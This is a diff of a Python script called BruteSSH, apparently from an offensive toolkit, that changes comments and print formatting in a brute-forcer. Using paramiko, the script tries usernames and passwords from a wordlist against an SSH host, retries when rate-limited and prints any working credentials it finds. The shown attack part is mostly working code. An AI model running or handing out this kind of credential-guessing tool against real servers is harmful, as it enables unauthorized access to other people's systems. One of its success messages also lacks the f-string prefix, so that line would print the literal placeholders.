@@ -1,6 +1,6 @@
 #!/usr/bin/python3
 
-# BruteFTP - FTP Brute Force Script
+# BruteSSH - SSH Brute Force Script
 
 # Imports all needed variables and packages
 from assets.banners import brutessh_banner
@@ -13,6 +13,7 @@ import socket
 import time
 
 
+# Main Function
 def brutessh_main():
 
     # Function that takes some user input
@@ -67,6 +68,7 @@ def brutessh_main():
         except KeyboardInterrupt:
             exit_shell()
 
+    # Function that brute forces
     def is_ssh_open(hostname, username, password):
         # initialize SSH client
         client = paramiko.SSHClient()
@@ -76,10 +78,10 @@ def brutessh_main():
             client.connect(hostname=hostname, username=username, password=password, timeout=3)
         except socket.timeout:
             # this is when host is unreachable
-            print("\u001b[31m[!] Host: {hostname} is unreachable, timed out.{Style.RESET_ALL}")
+            print("\u001b[31m[!] Host: " + hostname + " is unreachable, timed out.")
             return False
         except paramiko.AuthenticationException:
-            print("\u001b[31m[!] Invalid credentials for {username}:{password}")
+            print("\u001b[31m[!] Invalid credentials for " + username + ":" + password)
             return False
         except paramiko.SSHException:
             print("\u001b[36;1m[*] Quota exceeded, retrying with delay...")
@@ -91,6 +93,7 @@ def brutessh_main():
             print("\u001b[32;1m[+] Found combo:\n\tHOSTNAME: {hostname}\n\tUSERNAME: {username}\n\tPASSWORD: {password}{Style.RESET_ALL}")
             return True
 
+    # Function that does the process
     def process():
         # read the file
         passwords = open(wordlist_set).read().split("\n")
